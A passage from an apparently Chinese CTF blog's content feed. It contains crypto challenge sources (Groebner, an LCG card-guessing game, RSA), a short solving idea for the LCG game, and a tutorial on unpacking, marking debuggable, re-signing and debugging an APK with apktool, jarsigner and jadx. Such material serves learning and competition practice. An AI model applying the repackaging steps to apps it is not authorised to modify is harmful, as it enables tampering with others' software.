class="number">1024</span>)</span><br><span class="line">    s = <span class="built_in">sum</span>(m)</span><br><span class="line">    c = [<span class="built_in">pow</span>(m[i],e[i],p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    c.insert(<span class="number">0</span>,s)</span><br><span class="line">    c.insert(<span class="number">0</span>,p)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">key = os.urandom(LEN)</span><br><span class="line">Get_key = challenge(key,<span class="number">256</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">S_bytes = scissors(flag)</span><br><span class="line">C_bytes = ArrayXor(S_bytes,key)</span><br><span class="line">C_long  = LongArray(C_bytes)</span><br><span class="line"></span><br><span class="line">groebner_challenge = groebner_challenge(C_long,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;keyTask.chall&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;Get_key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;groebnerTask.chall&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;groebner_challenge&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>先学习下groeber基再回来补</p><h2 id="CardGame"><a href="#CardGame" class="headerlink" title="CardGame"></a>CardGame</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> cards <span class="keyword">import</span> Heart, Spade, Club, Diamond</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (Heart[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (Spade[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (Diamond[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (Club[(num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>]), <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GAME</span>():</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string"> ####    ##   #####  #####      ####    ##   #    # ###### </span></span><br><span class="line"><span class="string">#    #  #  #  #    # #    #    #    #  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure><p>没有交互环境<br>注意到选1后的第二三轮会给我们6个LCG中连续的数<br>那么我们就可以恢复LCG的三个系数 从而预测接下来的值<br>注意到这里它要我们给第15个字符(card[x][15])<br>而我们并不知道是多少 但是可以枚举(0-9 AKQJ)<br>只要最后分数达到50分即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Diary</title>
      <link href="/Diary/"/>
      <url>/Diary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2fe456f755160edb3bd01bd8dddbd8733d234acc342c41bd83eb7c36db3ec3de"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DailyPlan</title>
      <link href="/DailyPlan/"/>
      <url>/DailyPlan/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d17f9369c7ffde39e97b888fc503dfbfe2056e493a62b603cca4dfe60528718a">84ddd93a2d570b3707d5ad36f450649bd9089ff895aa022e66c86996c1b8d12f6b1a2e7545af9b92c954a9c981a69d03a814e0546808b15197565aa84da9fbdffd598111d62bb2b7441cb3a89a15939735e51debcd048bdf92fa3d4808693b555698723a51925ca7c3cb074886fa27b29df42402ae14b060aed6ca26281572fb5b6410022c9bc099074fd77ad46550242a4de171854d9edd59a42fe8b9c64bbb9037dd899199a5d80f8b49437d87fa7b44bcfd1f9f0bb13a64547677eceac1f00ab0e66d16f93e837cc352e1e12a30816ef6dbe1dafc9a1a3a30a4b0446912140de0b104b19b0cae993bc3843fd8a7626074290dc866897c59c83033f4a914b84adf61a0b652ee9005c9c0e46ec8035da88b7514b8335cf410e083e26cd3df83c0d4d001382f93aea62358d0fcf35f1a6f3b6bae9996a437ec32253cebdf305c3e329570809b8f7a28a09b49975678b89274f18141514680f49c4128f711953db14da40068bd88e0200718bd980a7ee026a69cf621106b0682cf6627680ebf57b04cc4f9e127c7fed5763a148ee9485de6b248fb417ea46b340f6c061cf68154e334ae92e5489047677e82470a6bdc307e885cf4c969385b221542e1b9d6fe8e61d0942f9a6128b32d71d4908f9b32e95aaf3b35ae26896ce276f84a0971e9aed34d2acd1da953faf8638e491d4c5d08f58f93fedf1a7f69a204a7dce0137a87570054e96048b267c3b89e6af05d8f1ebbb1b55bc56c20c2fa5e58417baee2b24b9520d607602bc17861cc9988759c4404e8dc46a24ee0f250d3daa8c7705f5ce5516f2ad0c5fd6b050882d9375a3621f7ab08dbcf9c8d4003055943e34ae372bcc61440ca50b0ea9bdfb152b11fa29675c2cbe7276220c0831c178df4236c885b0dbd1a8d8b5370239728085b44419d68147958db6a604a11d45af091949b2827c261d8d43f9c4501a74f43d51cf574697493715fdd6ad49de46d9c0f6f33bcc269413870fd53893f9ebc4ba7f97d62b83c9fb9c029e5c57a9d07d34f1a06d4ab9c19b5f851d6d67212ee82bb86e5ac933fc2af0e55fcc77b1232fc5b32cff5358c85e58f390cd7dae22bb7a63333d2f259d1aff04db186a2aaafa83a2ccae66de7e22b84d9a1d119be6ee23be7f6f2a8684db3eb846cac6f79de614b227f1a2d8e4c72d026b1db34ba28a4d8b47ca5f3d490a19a1d4f73eaf7b8cf175749193b34cc68d011f353c0501b05b4f995f2f2a70038523f0bd404c3d12c6221b2f97d607b35c4f41842430a9b05ce1b25aad3dd8ebb79ea81808f1cc74497f397b8ee165b199555483cc95d0dc0855b4acc75ec7b43e68883193a61be81a3d7a7f6c8befadb4f6c9a66f071837054c6c08c08dab9e05603201ebc99ca41379abb7d8a20e00892ecc9f05a4a6b32700c9d43ad1823ea1eae901d7f3442ae3e6279b343748c1481e3d0560619ab1ab04fbcf4c760f48f7d533b15cdada84bae85ea794187c80f576d9f6cfadfdcacab901a412ab790925bd8b23f6d76f5aebf9e633bc790198d64b7315a16fd4e6b25296830528f8db8cc4f607a0368583287189f937c0ebacaa4ea88d6656ed24a93135590b491bbd2d6669414f2f0e4f30bf1b0f2cff93c9f523c140d1c2776a3c50c2b8352af40eaa55946250019103b05edfac784f0569c39483bb0978e3fe0ab5f3156f5ec6937e7de5705127ff373a31a286ae3fd6acb77a29a788d5854aff1d265d4cb4a0b56efde5142da40ece1fa2b0c24d71c9ffb8ea0f6f87818cccd05467b742c1ece34eb9ff40f5c9b8a43e01b21ed336ae1792a313780e659dd258bfb8dd66d3462b75fd4ddb85473dd21d72e3e2fed01cbb5bc3fa7c773fd6662185f8ac27ea63d5704fcce3f1e3e85ad23bb0851ba1cf589d13c2bccae8f8d99d5c3cecd3fe2d811bc651279335f123d8a923f7fbe35897d8f26e0a35df37ea8c7a5e7002f30672c8f0ede99e4511f16a5ddbba65515f56be11f698b2176f75256ead99365525be065c97a25e642afd3074538b9ce706fccade0daab34a74ad9b8997fdcf968307ccd32d039835c86cd8a8bd4ab8ce0adc2e35d12bdb70f3ff71b790ca3eadcceb9d11b83c391635fdd6cea95fef0b81c98e9337447875f6d8bc97ffd54971432605403eafc202f91c3ef1970ec9c9b2a0bce85947de71fd6b60d726d821fdb416a5500a9075e05d1db2e37cc2815fbea6cc99879b09a233a0d5786951d1a8ed7a7cf4b7d0bbbc25e95b8d418ab2e89dc8eb4664e215b4751b1fd3bd8cea0bde629cd88148af416b94f1739129c4fa83f656f9bd92411b5c4444cb459e4e38b72bc9a7d823efcf57dcb0f70e717a7fcf9e4b8cf3e1e213e891799403f96ab42fc2f7aa751398b3bba3f0e2cf9a55209198806897317a0bd7d39f8c373a70c991d1defda4173db72f1a906c328efffc2466e3749f566048d55e17055ddb0b1a03bfab9fe4e797b17593742db524b0addd10d02afeb15c1572ca343b633569552c112e3c2106f0851bef6964fd0ab87b0bbac3eb92eb8b4568450dce90b2d521114392b7e7f530e15769d3e9b685c7bdcff4211773bb9b07c01fb15631f13124e1a77599c6d89d4e9a0deab58aa26e3e705662415708b1ebea7c75e8af31b8e4d49406d7ee093825b0d725ef3c4efff086c31f261b5a912fc0d7fdf18120d80f2b7f68c42a8a03c378d0a4a677acb308fe2618ebc67db2d0c91ede51eb33ec29a9268be588a53d5f9723b6df220d808f4553c9953f55a03bab53d928f540720886f486b6ad6074b215c37a4d604fc27ba992d9a50a137affa7c529811247235ffd7a6030be8aec09d61e9bb51bdbaa993c27a1b12ff11f26749d2fbfd72337ffb076686e9331d6fec6dffecb09df9cb496577766f517337fac4deb331740d7c49538765d456ea41d20e28ce776b79f524e5fab9962bb1b95ef87caf97dd7ba95fda581b363a58b5ae0352f5e5b1a710e13a8f170bed36c0011ddd49654b92d1d74b006c15dac83b00eb67b247de6d79172650104a48b66e249327664982bdb1c846dd75a3b6d0f9bc3a22ffb5f567dfe8dd3e5c8ae520a77c54a5a4df826903388c6cdb71907fe818ff77b87317a37a12b9973e77a0b46d9ebe0c715f95c24c4295104aa219948f8ea9e5612ec12a3793cf1e64c35ead19fdd3e56e1fccdb325b67ae7d6543d5aea1ef00edbdad5dac711e192cc7be9f32d7a4f3285607e6c41f63cc8324c160e9ad72bb9e1eca0c355186175fa03179060e3dade0173ffd76b948c065b7f39951fc5849e7f4592b55534a4b0dab370499a26f382d99c022213ee6db58e082ce73cce585d3c6616712541201f6f1856d70f8ee46aade1875ad61832a43d9377a311c47b97e94eb5cfce8a96265134eb41d400dd11c05ee521e98081d32c94d9441885c053e1b14d41a9e039d21d3d49bc3f2ee3bf720e9f375f9247224ba83ecb934068a7b5b9d8cc276d62dae2af005b9ab939a1d871bb4800733536540ff2a4da83792ed8d243941532de2678ed40b1439d9617b755efa718198793a2ba84395ccd8bb15b63e82664ae9e0c6c0c511f9d16de8d1d0eb6129d1348b31e08c3a4f4fe4fd66cebb0f2499ca5675560b6446661d3e203edd55b99c03ee3487e641b31bb000bb360c7992c0f4a07ec63ce9ab19468d49628ba2f6f4fb91f15281cbf3074e7f2d358a3a9c5508599ed6b53dd04ca30c158580d5306f88d15387d61e8de22ae180a49e1c2651ccc6b6333d40adfe7b8c7eb2f918b3c10116de5156143e12273dc6b1d58ae39c38f7b6efd4de5d6c19dcb3432d6dda136a6fa7dcbc650f41a00ed4bf11d2b1ebc916ffec7c96c4934988a9243f6977db1371627b6cba356fdd2c086bb05f7b019cdb1479a1327b5ad67a01800095cbd5ce85ae83455defa8b4923a4c1ffe246646398e0d033856100e0d5e41625b2893f3b033384af0f2ab127a031df28007fc69e96042eb790617ebc4fa539a0c4134af307fb22096a465a98795f8f4110230a83760d6cbbfeb12e9e11d23bb7c10e1f5e088f87407203701b7640c13cb23216df48b5b75c5e910f130dbfb6ce68ab780e43ceedc64a0cb2af2ff9c48541b2d04a8566c4425a9ab76d3885ed74a8b150ff126ecc2db984385b7cd08a14b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记录第一次jadx APK动调</title>
      <link href="/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1jadx-APK%E5%8A%A8%E8%B0%83/"/>
      <url>/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1jadx-APK%E5%8A%A8%E8%B0%83/</url>
      
        <content type="html"><![CDATA[<p>这里以NestarCTF2023 WEEK2的AndroDbgme 为例<br>详细记录了关于解包apk 修改manifest 后重签名打包及最后jadx调试的过程</p><span id="more"></span><p>首先在网上下载apktool(有.jar 和 .bat)<br>然后放在 C&#x2F;Windows下 配置一下环境变量<br>使用命令: apktool  d  xxx.apk 先解包<br>然后在manifest里的这里加上一句 使得允许调试</p><p><img src="https://s2.loli.net/2023/12/03/5N24EkviRs3Dbyn.png" alt="1AP~68`_X45`O17@M8SOR_R.png"></p><p>apktool  b  xxx 重新打包成apk</p><p>由于要重签名 所以要生成keystore<br><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore ./abc.keystore</code></p><p>生成keystore后签名</p><p><code>jarsigner -verbose -keystore ./abc.keystore -signedjar des.apk src.APK abc.keystore</code></p><p>签名完毕就可以得到改过manifest的apk了</p><p>接下来就是动态调试 我这里用的是 jadx+雷电模拟器</p><p>在模拟器启动apk</p><p>jadx打开 点击debug</p><p><img src="https://s2.loli.net/2023/12/03/thwLBGubS9EMWp4.png" alt="img"></p><p>随便下个断点 点击运行 就可以在apk看到flag了</p><p><img src="https://s2.loli.net/2023/12/03/4ERAbnhmViyXkzw.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2023 10</title>
      <link href="/DASCTF-X-CBCTF-2023-10/"/>
      <url>/DASCTF-X-CBCTF-2023-10/</url>
      
        <content type="html"><![CDATA[<p>能力有限 只能复现能做的一些题 其他的慢慢补</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>chall.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">f</span>):</span><br><span class="line">    random_chars = <span class="built_in">bytes</span>([random.randint(<span class="number">0</span>, <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line">    f = f + random_chars</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_p</span>(<span class="params">p</span>):</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    P = p</span><br><span class="line">    n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> jacobi(<span class="number">2</span>,n1) == <span class="number">1</span>:</span><br><span class="line">            n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">while</span> P:</span><br><span class="line">            pad = random.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">2023</span>)**<span class="number">2</span> </span><br><span class="line">            message = pad &lt;&lt; <span class="number">1</span> + P % <span class="number">2</span></span><br><span class="line">            cipher = <span class="built_in">pow</span>(message, e, n1)</span><br><span class="line">            f.write(<span class="built_in">str</span>(cipher)+<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            P //= <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n1 = &quot;</span>+ <span class="built_in">str</span>(n1) )    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_q</span>(<span class="params">q</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">q, n</span>):</span><br><span class="line">        e = random.randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">        noise = random.randint(<span class="number">0</span>, n - <span class="number">1</span>)</span><br><span class="line">        c = <span class="built_in">pow</span>(q+noise,e,n)</span><br><span class="line">        <span class="keyword">return</span> e, noise,c </span><br><span class="line">    </span><br><span class="line">    n2 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    e1, noise1, c1 = encrypt(q, n2)</span><br><span class="line">    e2, noise2, c2 = encrypt(q, n2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n2 = &quot;</span>+ <span class="built_in">str</span>(n2) ) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e1, noise1, c1) =&#x27;</span>, (e1,noise1,c1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e2, noise2, c2) =&#x27;</span>, (e2,noise2,c2))</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">guess_p(p)</span><br><span class="line">guess_q(q)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = padding(flag)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line"><span class="string">n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line"><span 